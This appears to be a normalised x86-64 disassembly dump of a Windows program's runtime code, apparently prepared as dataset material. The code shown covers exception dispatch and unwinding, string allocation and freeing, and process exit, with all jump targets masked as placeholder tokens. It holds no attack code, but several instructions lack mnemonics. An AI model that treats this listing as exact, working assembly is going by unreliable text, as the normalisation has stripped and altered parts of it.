mov rcx [ rbp + 0x148 ]
mov rcx [ rcx + 0x28 ]
mov [ rcx + 0x34 ] eax
call sub_404d00
mov rcx [ rbp + 0x148 ]
mov rcx [ rcx + 0x28 ]
mov [ rcx + 0x100 ] ax
jmp r-xdata
test eax eax
jne r-xdata
mov rax [ rbp + 0xe0 ]
mov rcx [ rbp + 0xf0 ]
mov ecx [ rcx + 0xc ]
lea rax [ rax + rcx ]
mov [ rbp + 0x80 ] rax
mov rax [ rbp + 0xe0 ]
mov rcx [ rbp + 0xf0 ]
mov ecx [ rcx + 0x4 ]
lea rax [ rax + rcx ]
mov [ rbp + 0x80 ] rax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rax [ rbp + 0x130 ]
mov rax [ rax + 0x28 ]
mov rax [ rax ]
mov [ rbp + 0xa8 ] rax
jmp r-xdata
mov rax [ rbp + 0x130 ]
cmp [ rax ] 0xeedfade
jne r-xdata
mov rax [ rbp + 0xe0 ]
mov rcx [ rbp + 0xf0 ]
mov ecx [ rcx + 0xc ]
lea rax [ rax + rcx ]
mov [ rbp + 0x80 ] rax
jmp r-xdata
nop
mov [ rbp + 0x108 ] 0x0
call sub_40a3e0
mov rax [ rax + 0x188 ]
mov [ rbp + 0x100 ] rax
cmp [ rbp + 0x100 ] 0x0
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rax [ rbp + 0x130 ]
mov rax [ rax + 0x28 ]
mov [ rbp + 0xb0 ] rax
mov rax [ rbp + 0x130 ]
mov rax [ rax + 0x20 ]
mov [ rbp + 0xa0 ] rax
mov [ rbp + 0x7b ] 0x1
jmp r-xdata
mov rax [ rbp + 0x130 ]
cmp [ rax ] 0xeedfade
jne r-xdata
mov rcx [ rbp + 0x130 ]
call [ rw-data ]
mov [ rbp + 0xa8 ] rax
cmp [ rbp + 0xa8 ] 0x0
je r-xdata
mov rax [ rbp + 0xe0 ]
mov rcx [ rbp + 0xf0 ]
mov ecx [ rcx + 0x8 ]
lea rax [ rax + rcx ]
mov [ rbp + 0x90 ] rax
mov rcx [ rbp + 0x148 ]
mov rdx [ rbp + 0xa8 ]
mov r8 [ rbp + 0x90 ]
call sub_406050
mov [ rbp + 0x98 ] rax
cmp [ rbp + 0x98 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rax [ rbp + 0x130 ]
mov rax [ rax + 0x28 ]
mov rax [ rax ]
mov [ rbp + 0xa8 ] rax
jmp r-xdata
cmp [ rbp + 0x80 ] 0x0
je r-xdata
nop
jmp r-xdata
mov rax [ rbp + 0x100 ]
cmp rax [ rbp + 0xf8 ]
jne r-xdata
mov rax [ rbp + 0xe0 ]
mov rcx [ rbp + 0xf0 ]
mov ecx [ rcx + 0xc ]
lea rax [ rax + rcx ]
mov [ rbp + 0x80 ] rax
mov rax [ rbp + 0x148 ]
mov rcx [ rbp + 0xe0 ]
mov rdx [ rbp + 0xf0 ]
mov edx [ rdx + 0x4 ]
lea rcx [ rcx + rdx ]
mov [ rax ] rcx
mov rax [ rbp + 0x130 ]
mov [ rbp + 0xc8 ] rax
mov rax [ rbp + 0x140 ]
mov [ rbp + 0xd0 ] rax
mov rax [ rbp + 0xf8 ]
mov rax [ rax + 0x10 ]
mov [ rbp + 0xb0 ] rax
mov rax [ rbp + 0xf8 ]
mov rax [ rax + 0x8 ]
mov [ rbp + 0xa0 ] rax
lea rcx [ rbp + 0xc8 ]
mov rdx [ rbp + 0x138 ]
mov r8 [ rbp + 0xb0 ]
mov r9 [ rbp + 0xa0 ]
call [ rbp + 0x80 ]
mov [ rbp + 0x80 ] rax
mov rax [ rbp + 0x148 ]
mov rcx [ rbp + 0x80 ]
mov [ rax ] rcx
mov rax [ rbp + 0xf8 ]
cmp [ rax + 0x10 ] 0x0
je r-xdata
mov rcx [ rbp + 0x130 ]
call [ rw-data ]
mov [ rbp + 0xb0 ] rax
cmp [ rbp + 0xb0 ] 0x0
je r-xdata
movzx rax [ rw-data ]
cmp al [ rbp + 0x7b ]
jbe r-xdata
mov rax [ rbp + 0xe0 ]
mov rcx [ rbp + 0x98 ]
mov ecx [ rcx + 0x4 ]
lea rax [ rax + rcx ]
mov [ rbp + 0x80 ] rax
jmp r-xdata
mov rcx [ rbp + 0x130 ]
call [ rw-data ]
mov [ rbp + 0xa8 ] rax
mov [ rbp + 0xa8 ] 0x0
jmp r-xdata
cmp [ rbp + 0xa8 ] 0x0
je r-xdata
mov rax [ rbp + 0x148 ]
mov rcx [ rbp + 0x80 ]
cmp rcx [ rax + 0x20 ]
jne r-xdata
mov rax [ rbp + 0x100 ]
mov [ rbp + 0x108 ] rax
mov rax [ rbp + 0x100 ]
mov rax [ rax ]
mov [ rbp + 0x100 ] rax
cmp [ rbp + 0x100 ] 0x0
jne r-xdata
cmp [ rbp + 0x108 ] 0x0
jne r-xdata
mov rax [ rbp + 0xf8 ]
mov rcx [ rax + 0x10 ]
call sub_405480
mov rax [ rbp + 0xf8 ]
mov [ rax + 0x10 ] 0x0
mov rax [ rbp + 0x130 ]
mov rax [ rax + 0x10 ]
mov [ rbp + 0xa0 ] rax
mov [ rbp + 0x7b ] 0x1
mov rax [ rbp + 0x130 ]
cmp [ rax ] 0xeefface
je r-xdata
mov rax [ rbp + 0x130 ]
or [ rax + 0x4 ] 0x2
mov rax [ rbp + 0xf0 ]
cmp [ rax + 0x8 ] 0x2
jb r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov rax [ rbp + 0xe0 ]
mov rcx [ rbp + 0xf0 ]
mov ecx [ rcx + 0x8 ]
lea rax [ rax + rcx ]
mov [ rbp + 0x90 ] rax
mov rcx [ rbp + 0x148 ]
mov rdx [ rbp + 0xa8 ]
mov r8 [ rbp + 0x90 ]
call sub_406050
mov [ rbp + 0x98 ] rax
cmp [ rbp + 0x98 ] 0x0
je r-xdata
mov rax [ rbp + 0xf0 ]
cmp [ rax + 0x8 ] 0x2
jne r-xdata
cmp [ rbp + 0x108 ] 0x0
jne r-xdata
mov rax [ rbp + 0xf0 ]
cmp [ rax + 0x8 ] 0x1
jne r-xdata
mov rcx [ rbp + 0xb0 ]
mov rdx [ rbp + 0x140 ]
call sub_405ee0
mov [ rbp + 0x7b ] 0x0
lea rax [ rbp + 0x60 ]
mov [ rbp + 0x100 ] rax
call sub_404860
mov [ rbp + 0x100 ] rax
jmp r-xdata
mov rax [ rbp + 0x130 ]
mov [ rbp + 0xc8 ] rax
mov rax [ rbp + 0x140 ]
mov [ rbp + 0xd0 ] rax
lea rcx [ rbp + 0xc8 ]
call UnhandledExceptionFilter
mov [ rbp + 0x7c ] eax
cmp [ rbp + 0x7c ] 0x0
je r-xdata
mov rax [ rbp + 0xe0 ]
mov rcx [ rbp + 0x98 ]
mov ecx [ rcx + 0x4 ]
lea rax [ rax + rcx ]
mov [ rbp + 0x80 ] rax
mov rcx [ rbp + 0x80 ]
call sub_405f50
jmp r-xdata
mov rcx [ rbp + 0x80 ]
call sub_405f70
jmp r-xdata
mov rax [ rbp + 0x108 ]
mov rcx [ rbp + 0x100 ]
mov rcx [ rcx ]
mov [ rax ] rcx
call sub_40a3e0
mov [ rax + 0x188 ] 0x0
jmp r-xdata
mov rax [ rbp + 0x100 ]
mov rcx [ rbp + 0xa0 ]
mov [ rax + 0x8 ] rcx
mov rax [ rbp + 0x100 ]
mov rcx [ rbp + 0xb0 ]
mov [ rax + 0x10 ] rcx
mov rax [ rbp + 0x100 ]
mov [ rbp + 0x50 ] rax
call sub_40a3e0
lea rcx [ 0x188 ]
lea rax [ rax + rcx ]
mov [ rbp + 0x48 ] rax
mov rax [ rbp + 0x50 ]
mov rcx [ rbp + 0x48 ]
mov rcx [ rcx ]
mov [ rax ] rcx
mov rax [ rbp + 0x48 ]
mov rcx [ rbp + 0x50 ]
mov [ rax ] rcx
mov rcx [ rbp + 0x138 ]
mov rdx [ rbp + 0x80 ]
mov r8 [ rbp + 0x130 ]
mov r9 [ rbp + 0xb0 ]
mov rax [ rbp + 0x148 ]
mov rax [ rax + 0x28 ]
mov [ rsp + 0x20 ] rax
mov rax [ rbp + 0x148 ]
mov rax [ rax + 0x40 ]
mov [ rsp + 0x28 ] rax
call RtlUnwindEx
mov rcx [ rbp + 0x100 ]
call sub_4048e0
jmp r-xdata
mov rax [ rbp + 0x100 ]
mov rcx [ rax + 0x10 ]
call sub_405480
mov rax [ rbp + 0x100 ]
mov [ rax + 0x10 ] 0x0
mov rax [ rbp + 0x100 ]
cmp [ rax + 0x10 ] 0x0
je r-xdata
sub_406a60
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x108 ]
mov rcx rbp
neg rcx
mov [ rax + rcx ] 0x0
call sub_40a3e0
lea rcx [ rbx + rbp + 0x100 ]
mov rdx rbp
neg rdx
mov rax [ rax + 0x188 ]
mov [ rcx + rdx ] rax
lea rax [ rbx + rbp + 0x100 ]
mov rcx rbp
neg rcx
cmp [ rax + rcx ] 0x0
je r-xdata
nop
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
lea rax [ rbx + rbp + 0x100 ]
mov rcx rbp
neg rcx
lea rdx [ rbx + rbp + 0xf8 ]
mov r8 rbp
neg r8
mov rax [ rax + rcx ]
cmp rax [ rdx + r8 ]
jne r-xdata
lea rax [ rbx + rbp + 0x108 ]
mov rcx rbp
neg rcx
lea rdx [ rbx + rbp + 0x100 ]
mov r8 rbp
neg r8
mov rdx [ rdx + r8 ]
mov [ rax + rcx ] rdx
lea rax [ rbx + rbp + 0x100 ]
mov rcx rbp
neg rcx
lea rdx [ rbx + rbp + 0x100 ]
mov r8 rbp
neg r8
mov rdx [ rdx + r8 ]
mov rdx [ rdx ]
mov [ rax + rcx ] rdx
lea rax [ rbx + rbp + 0x100 ]
mov rcx rbp
neg rcx
cmp [ rax + rcx ] 0x0
jne r-xdata
lea rax [ rbx + rbp + 0x108 ]
mov rcx rbp
neg rcx
cmp [ rax + rcx ] 0x0
jne r-xdata
lea rax [ rbx + rbp + 0x108 ]
mov rcx rbp
neg rcx
cmp [ rax + rcx ] 0x0
jne r-xdata
lea rax [ rbx + rbp + 0xf0 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
cmp [ rax + 0x8 ] 0x1
jne r-xdata
lea rax [ rbx + rbp + 0x108 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
lea rcx [ rbx + rbp + 0x100 ]
mov rdx rbp
neg rdx
mov rcx [ rcx + rdx ]
mov rcx [ rcx ]
mov [ rax ] rcx
call sub_40a3e0
mov [ rax + 0x188 ] 0x0
jmp r-xdata
lea rax [ rbx + rbp + 0x100 ]
mov rcx rbp
neg rcx
mov rcx [ rax + rcx ]
call sub_4048e0
jmp r-xdata
lea rax [ rbx + rbp + 0x100 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
mov rcx [ rax + 0x10 ]
call sub_405480
lea rax [ rbx + rbp + 0x100 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
mov [ rax + 0x10 ] 0x0
lea rax [ rbx + rbp + 0x100 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
cmp [ rax + 0x10 ] 0x0
je r-xdata
sub_406c40
push rbp
push rsi
push rbx
sub rsp 0xf0
mov rbp rsp
mov rbx rcx
mov rsi rdx
test rbx rbx
jne r-xdata
mov [ rbp + 0xb8 ] rsi
mov [ rbp + 0xc0 ] rbx
mov [ rbp + 0xc8 ] 0x0
mov [ rbp + 0xd0 ] 0x0
mov [ rbp + 0xd8 ] 0x0
mov [ rbp + 0xe0 ] 0x0
mov [ rbp + 0xe8 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov cl 0xd8
call sub_4075a0
mov ecx 0xeedfade
mov edx 0x1
mov r8d 0x7
lea r9 [ rbp + 0xb8 ]
call [ rw-data ]
lea rsp [ rbp + 0xf0 ]
pop rbx
pop rsi
pop rbp
retn
mov [ rbp + 0x20 ] 0xeedfade
mov [ rbp + 0x24 ] 0x1
mov [ rbp + 0x28 ] 0x0
mov [ rbp + 0x30 ] rsi
mov [ rbp + 0x38 ] 0x7
mov rax [ rbp + 0xb8 ]
mov [ rbp + 0x40 ] rax
mov rax [ rbp + 0xc0 ]
mov [ rbp + 0x48 ] rax
mov rax [ rbp + 0xc8 ]
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0xd0 ]
mov [ rbp + 0x58 ] rax
mov rax [ rbp + 0xd8 ]
mov [ rbp + 0x60 ] rax
mov rax [ rbp + 0xe0 ]
mov [ rbp + 0x68 ] rax
mov rax [ rbp + 0xe8 ]
mov [ rbp + 0x70 ] rax
lea rcx [ rbp + 0x20 ]
call [ rw-data ]
sub_406d90
push rsi
push rbx
sub rsp 0x28
call sub_40a3e0
mov rax [ rax + 0x188 ]
mov rbx [ rax + 0x10 ]
mov rsi [ rax + 0x8 ]
mov [ rax + 0x10 ] 0x0
mov rcx rbx
mov rdx rsi
call sub_405eb0
mov rcx rbx
mov rdx rsi
call sub_406c40
add rsp 0x28
pop rbx
pop rsi
retn
sub_406dd0
push r13
push rdi
push rsi
push rbx
sub rsp 0x28
call sub_40a3e0
lea rcx [ 0x188 ]
lea rsi [ rax + rcx ]
mov rbx [ rsi ]
test rbx rbx
jne r-xdata
mov rax [ rbx ]
mov [ rsi ] rax
mov rsi [ rbx + 0x10 ]
mov rdi [ rbx + 0x8 ]
mov [ rbx + 0x10 ] 0x0
mov rcx rbx
call sub_4048e0
call sub_40a3e0
cmp [ rax + 0x188 ] 0x0
je r-xdata
mov cl 0xd8
call sub_4075a0
add rsp 0x28
pop rbx
pop rsi
pop rdi
pop r13
retn
test rsi rsi
je r-xdata
call sub_40a3e0
lea rcx [ 0x188 ]
lea r13 [ rax + rcx ]
mov rbx [ r13 ]
test rbx rbx
jne r-xdata
mov rax [ rbx ]
mov [ r13 ] rax
cmp [ rbx + 0x10 ] 0x0
je r-xdata
mov cl 0xd8
call sub_4075a0
mov rcx rbx
call sub_4048e0
call sub_404860
mov [ rax + 0x8 ] rdi
mov [ rax + 0x10 ] rsi
mov rbx rax
call sub_40a3e0
lea rcx [ 0x188 ]
lea rax [ rax + rcx ]
mov rcx [ rax ]
mov [ rbx ] rcx
mov [ rax ] rbx
mov rcx [ rbx + 0x10 ]
call sub_405480
sub_406ea0
push rbp
push rsi
push rbx
sub rsp 0x20
mov rbp rsp
call sub_40a3e0
lea rcx [ 0x188 ]
lea rsi [ rax + rcx ]
mov rbx [ rsi ]
test rbx rbx
jne r-xdata
mov rax [ rbx ]
mov [ rsi ] rax
cmp [ rbx + 0x10 ] 0x0
je r-xdata
mov cl 0xd8
call sub_4075a0
mov rcx rbx
call sub_4048e0
lea rax [ rbp + rbp + 0x38 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
mov rcx rax
call sub_405fd0
lea rsp [ rbp + 0x20 ]
pop rbx
pop rsi
pop rbp
retn
mov rcx [ rbx + 0x10 ]
call sub_405480
sub_406f10
push rbp
sub rsp 0x50
mov rbp rsp
mov [ rbp + 0x28 ] rbp
cmp [ rw-data ] 0x0
je r-xdata
lea rsp [ rbp + 0x50 ]
pop rbp
retn
mov eax [ rw-data ]
mov [ rbp + 0x4c ] eax
mov rax [ rw-data ]
mov rax [ rax + 0x8 ]
mov [ rbp + 0x40 ] rax
nop
cmp [ rbp + 0x4c ] 0x0
jle r-xdata
nop
jmp r-xdata
sub [ rbp + 0x4c ] 0x1
mov eax [ rbp + 0x4c ]
mov [ rw-data ] eax
mov rax [ rbp + 0x40 ]
movsxd rcx [ rbp + 0x4c ]
add rcx rcx
mov rax [ rax + rcx * 8 + 0x8 ]
mov [ rbp + 0x38 ] rax
cmp [ rbp + 0x38 ] 0x0
je r-xdata
cmp [ rbp + 0x4c ] 0x0
jg r-xdata
mov rax [ rbp + 0x38 ]
cmp [ rax ] 0x0
je r-xdata
call [ rbp + 0x38 ]
sub_406fb0
push rbp
sub rsp 0x50
mov rbp rsp
mov [ rbp + 0x28 ] rbp
cmp [ rw-data ] 0x0
je r-xdata
lea rsp [ rbp + 0x50 ]
pop rbp
retn
mov rax [ rw-data ]
mov eax [ rax ]
mov [ rbp + 0x4c ] eax
mov [ rbp + 0x48 ] 0x0
mov rax [ rw-data ]
mov rax [ rax + 0x8 ]
mov [ rbp + 0x40 ] rax
nop
mov eax [ rbp + 0x48 ]
cmp eax [ rbp + 0x4c ]
jge r-xdata
nop
jmp r-xdata
mov rax [ rbp + 0x40 ]
movsxd rcx [ rbp + 0x48 ]
add rcx rcx
mov rax [ rax + rcx * 8 ]
mov [ rbp + 0x38 ] rax
add [ rbp + 0x48 ] 0x1
mov eax [ rbp + 0x48 ]
mov [ rw-data ] eax
cmp [ rbp + 0x38 ] 0x0
je r-xdata
mov eax [ rbp + 0x48 ]
cmp eax [ rbp + 0x4c ]
jl r-xdata
mov rax [ rbp + 0x38 ]
cmp [ rax ] 0x0
je r-xdata
call [ rbp + 0x38 ]
sub_407060
sub rsp 0x28
lea rax [ sub_402320 ]
mov [ rw-data ] rax
lea rax [ r-xdata ]
mov [ rw-data ] rax
mov [ rw-data ] rcx
mov [ rw-data ] 0x0
mov [ rw-data ] rdx
mov rax [ rdx + 0x8 ]
mov [ rw-data ] rax
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
call sub_406fb0
add rsp 0x28
retn
sub_4070c0
mov cl 0x10
mov r8d [ rw-data ]
lea r9 [ rw-data ]
movzx r10 cl
mov r11d 0xa
mov eax r8d
cdq
idiv r11d
add dl 0x30
mov [ r9 + r10 ] dl
mov r9d 0xa
mov eax r8d
cdq
idiv r9d
mov r8 rax
sub cl 0x1
test r8d r8d
jne r-xdata
mov cl 0x24
mov rax [ rw-data ]
lea rdx [ rw-data ]
movzx r8 cl
lea r9 [ rw-data ]
mov r10 rax
and r10 0xf
movzx r9 [ r9 + r10 ]
mov [ rdx + r8 ] r9b
mov r8d 0x10
xor edx edx
div r8
sub cl 0x1
test rax rax
jne r-xdata
retn
sub_4071b0
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x50 ] rcx
mov [ rbp + 0x58 ] dl
mov [ rbp + 0x60 ] r8d
cmp [ rbp + 0x58 ] 0x0
je r-xdata
nop
mov rcx [ rbp + 0x50 ]
xor rdx rdx
call sub_4053c0
mov rax [ rbp + 0x50 ]
mov ecx [ rbp + 0x60 ]
mov [ rax + 0x8 ] ecx
cmp [ rbp + 0x58 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
movzx rdx [ rbp + 0x58 ]
call sub_405d70
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x50 ]
call sub_405db0
mov [ rbp + 0x50 ] rax
jmp r-xdata
sub_40720e
cmp [ rbp + 0x58 ] 0x0
je r-xdata
call sub_406d90
nop
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
cmp [ rbp + 0x50 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
mov dl 0x81
mov rax [ rbp + 0x50 ]
mov rbx [ rax ]
call [ rbx - 0x20 ]
mov rcx [ rbp + 0x50 ]
call sub_405d90
sub_407260
push rbx
sub rsp 0x20
mov rbx rcx
movsxd rcx [ rbx - 0x80 ]
call sub_407150
mov rcx rbx
mov rdx rax
call sub_4054a0
mov rcx rax
mov rax rcx
add rsp 0x20
pop rbx
retn
sub_4072b0
push rdi
push rsi
sub rsp 0x28
mov rdi rcx
mov rsi [ rdi ]
mov ecx 0x7
[ rdi ] [ rsi ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
mov rcx [ r-xdata ]
mov dl 0x1
mov r8d eax
call sub_4071b0
mov rcx rax
call sub_406d60
add rsp 0x28
pop rsi
pop rdi
retn
sub_407300
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
add rsp 0x40
pop rbx
retn
xor rcx rcx
lea rdx [ rw-data ]
lea r8 [ rw-data ]
xor r9 r9
call MessageBoxA
mov ecx 0xfffffff5
call GetStdHandle
mov rcx rax
lea rdx [ rw-data ]
mov r8d 0x25
lea r9 [ rsp + 0x3c ]
mov [ rsp + 0x20 ] 0x0
call sub_4022d0
mov ecx 0xfffffff5
call GetStdHandle
mov rbx rax
lea rcx [ r-xdata ]
call sub_4084e0
mov rcx rbx
mov rdx rax
mov r8d 0x2
lea r9 [ rsp + 0x3c ]
mov [ rsp + 0x20 ] 0x0
call sub_4022d0
jmp r-xdata
cmp [ rw-data ] 0x0
jbe r-xdata
lea rcx [ rw-data ]
call [ rw-data ]
sub_4073e0
push rdi
push rsi
push rbx
sub rsp 0x20
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4070c0
call sub_407300
mov [ rw-data ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
cmp eax [ rw-data ]
jne r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
lea rcx [ rw-data ]
call sub_4072b0
call sub_4049c0
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
nop
mov rbx [ rw-data ]
mov [ rw-data ] 0x0
call rbx
cmp [ rw-data ] 0x0
jne r-xdata
nop
call sub_406f10
cmp [ rw-data ] 0x1
jbe r-xdata
mov rcx rax
call sub_405480
call sub_4049c0
test rax rax
jne r-xdata
mov [ rw-data ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
cmp [ rw-data ] 0x1
jne r-xdata
mov rcx [ rw-data ]
call sub_409b20
mov rax [ rw-data ]
mov rcx [ rw-data ]
mov rax [ rax + 0x20 ]
cmp rax [ rcx + 0x8 ]
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call [ rw-data ]
mov rax [ rw-data ]
cmp [ rax + 0x20 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
lea rcx [ rw-data ]
call sub_4072b0
mov rax [ rw-data ]
mov rcx [ rax + 0x20 ]
call sub_402360
mov rsi [ rw-data ]
lea rdi [ rw-data ]
mov ecx 0x7
[ rdi ] [ rsi ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ rw-data ]
call ExitProcess
call [ rw-data ]
sub_4075d0
push rsi
push rbx
sub rsp 0x28
call sub_404960
mov rbx rax
call sub_404990
mov rsi rax
mov rcx rbx
mov rdx rsi
call sub_406010
cmp [ rw-data ] 0x0
je r-xdata
mov ecx 0xd9
mov rdx rsi
call sub_404a10
mov rcx rbx
mov rdx rsi
call [ rw-data ]
sub_407620
push rbx
sub rsp 0x20
mov ebx ecx
xor rax rax
test ebx ebx
jle r-xdata
add rsp 0x20
pop rbx
retn
cmp ebx 0x3ffffff7
jl r-xdata
mov ecx ebx
add ecx 0x1
add ecx ecx
add ecx 0x10
movsxd rcx ecx
call sub_404780
mov rcx rax
lea rax [ rcx + 0x10 ]
mov [ rcx + 0xc ] ebx
mov [ rcx + 0x8 ] 0x1
mov [ rcx + 0x6 ] 0x2
movzx rdx [ rw-data ]
mov [ rcx + 0x4 ] dx
movsxd rbx ebx
mov [ rax + rbx * 2 ] 0x0
call sub_4050f0
sub_407680
push rsi
push rbx
sub rsp 0x28
mov ebx ecx
mov esi edx
xor rcx rcx
test ebx ebx
jle r-xdata
mov rax rcx
add rsp 0x28
pop rbx
pop rsi
retn
cmp ebx 0x7fffffef
jl r-xdata
mov eax ebx
add eax 0x1
and eax 0x1
mov ecx ebx
add ecx eax
add ecx 0x11
movsxd rcx ecx
call sub_404780
lea rcx [ rax + 0x10 ]
mov [ rax + 0xc ] ebx
mov [ rax + 0x8 ] 0x1
test si si
jne r-xdata
call sub_4050f0
mov [ rax + 0x4 ] si
mov [ rax + 0x6 ] 0x1
mov r8d 0x2
mov eax ebx
cdq
idiv r8d
movsxd rax eax
mov [ rcx + rax * 2 ] 0x0
movzx rsi [ rw-data ]
sub_407730
push rbx
sub rsp 0x20
mov rbx rcx
cmp [ rbx ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rax [ rbx ]
lea rax [ rax - 0x10 ]
mov [ rbx ] 0x0
cmp [ rax + 0x8 ] 0x0
jle r-xdata
or edx 0xffffffff
mov ecx edx
[ rax + 0x8 ] edx
add ecx edx
test ecx ecx
jne r-xdata
mov rcx rax
call sub_4047b0
sub_407780
push rbx
sub rsp 0x20
mov rbx rcx
cmp [ rbx ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rax [ rbx ]
lea rax [ rax - 0x10 ]
mov [ rbx ] 0x0
cmp [ rax + 0x8 ] 0x0
jle r-xdata
or edx 0xffffffff
mov ecx edx
[ rax + 0x8 ] edx
add ecx edx
test ecx ecx
jne r-xdata
mov rcx rax
call sub_4047b0
sub_4077d0
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov rbx rcx
cmp [ rbx ] 0x0
je r-xdata
mov rax rbx
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rax [ rbx ]
mov [ rbp + 0x28 ] rax
mov [ rbx ] 0x0
mov rcx [ rbp + 0x28 ]
call SysFreeString
sub_407810
push rsi
push rbx
sub rsp 0x28
mov ebx edx
mov rsi rcx
test ebx ebx
jle r-xdata
nop
add rsp 0x28
pop rbx
pop rsi
retn
mov rcx rsi
call sub_407730
sub ebx 0x1
add rsi 0x8
test ebx ebx
jg r-xdata
sub_407840
push rsi
push rbx
sub rsp 0x28
mov ebx edx
mov rsi rcx
test ebx ebx
jle r-xdata
nop
add rsp 0x28
pop rbx
pop rsi
retn
mov rcx rsi
call sub_407780
sub ebx 0x1
add rsi 0x8
test ebx ebx
jg r-xdata
sub_407870
push rbp
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov ebx edx
mov rsi rcx
test ebx ebx
jle r-xdata
nop
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rbp
retn
mov rax [ rsi ]
mov [ rbp + 0x28 ] rax
cmp [ rbp + 0x28 ] 0x0
je r-xdata
add rsi 0x8
sub ebx 0x1
test ebx ebx
jg r-xdata
mov [ rsi ] 0x0
mov rcx [ rbp + 0x28 ]
call SysFreeString
sub_407900
sub rsp 0x48
cmp [ rsp + 0x70 ] 0x0
jne r-xdata
mov eax [ rsp + 0x70 ]
xor r10 r10
mov [ rsp + 0x20 ] rcx
mov [ rsp + 0x28 ] edx
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x38 ] 0x0
mov ecx eax
mov edx r10d
call sub_40a030
add rsp 0x48
retn
mov eax [ rw-data ]
mov [ rsp + 0x70 ] eax
sub_4079a0
push rbp
push rdi
push rsi
push rbx
sub rsp 0x38
mov rbp rsp
mov rbx rcx
mov rsi rdx
mov edi r8d
mov rax [ rbx ]
mov [ rbp + 0x28 ] rax
test edi edi
jle r-xdata
mov [ rbx ] 0x0
mov ecx edi
call sub_407620
mov [ rbx ] rax
test rsi rsi
je r-xdata
lea rcx [ rbp + 0x28 ]
call sub_407730
lea rsp [ rbp + 0x38 ]
pop rbx
pop rsi
pop rdi
pop rbp
retn
mov rcx rsi
mov rdx [ rbx ]
mov r8d edi
add r8d r8d
movsxd r8 r8d
call sub_404ae0
jmp r-xdata
sub_407a00
push r13
push rdi
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
mov rsi rdx
mov edi r8d
mov ecx edi
mov edx r9d
call sub_407680
mov r13 rax
test rsi rsi
je r-xdata
mov rcx rbx
call sub_407780
mov [ rbx ] r13
add rsp 0x28
pop rbx
pop rsi
pop rdi
pop r13
retn
mov rcx rsi
mov rdx r13
movsxd r8 edi
call sub_404ae0
sub_407a50
push rbp
push r13
push rdi
push rsi
push rbx
mov [ rsp - 0x40 ] 0x0
mov [ rsp - 0x1040 ] 0x0
sub rsp 0x1040
mov rbp rsp
mov [ rbp + 0x38 ] rcx
mov rbx rdx
mov esi r8d
mov edi r9d
test esi esi
jg r-xdata
mov eax esi
add eax 0x1
cmp eax 0x7ff
jge r-xdata
mov rcx [ rbp + 0x38 ]
call sub_407730
jmp r-xdata
mov r13d esi
add r13d 0x1
mov rcx [ rbp + 0x38 ]
mov edx r13d
call sub_408980
mov rax [ rbp + 0x38 ]
mov rcx [ rax ]
mov edx r13d
mov r8 rbx
mov r9d esi
mov [ rsp + 0x20 ] edi
call sub_407970
mov r13d eax
test r13d r13d
jge r-xdata
lea rcx [ rbp + 0x40 ]
mov edx 0x7ff
mov r8 rbx
mov r9d esi
mov [ rsp + 0x20 ] edi
call sub_407970
mov r13d eax
test r13d r13d
jle r-xdata
lea rsp [ rbp + 0x1040 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov rcx [ rbp + 0x38 ]
mov edx r13d
call sub_408980
xor r13 r13
mov rcx [ rbp + 0x38 ]
lea rdx [ rbp + 0x40 ]
mov r8d r13d
call sub_4079a0
jmp r-xdata
sub_407b20
push r13
push rdi
push rsi
push rbx
sub rsp 0x48
mov [ rsp + 0x38 ] rcx
mov rbx rdx
mov esi r8d
mov edi r9d
test esi esi
jg r-xdata
test di di
jne r-xdata
mov rcx [ rsp + 0x38 ]
call sub_407780
jmp r-xdata
xor rcx rcx
xor rdx rdx
mov r8 rbx
mov r9d esi
movzx eax di
mov [ rsp + 0x20 ] eax
call sub_407900
mov r13d eax
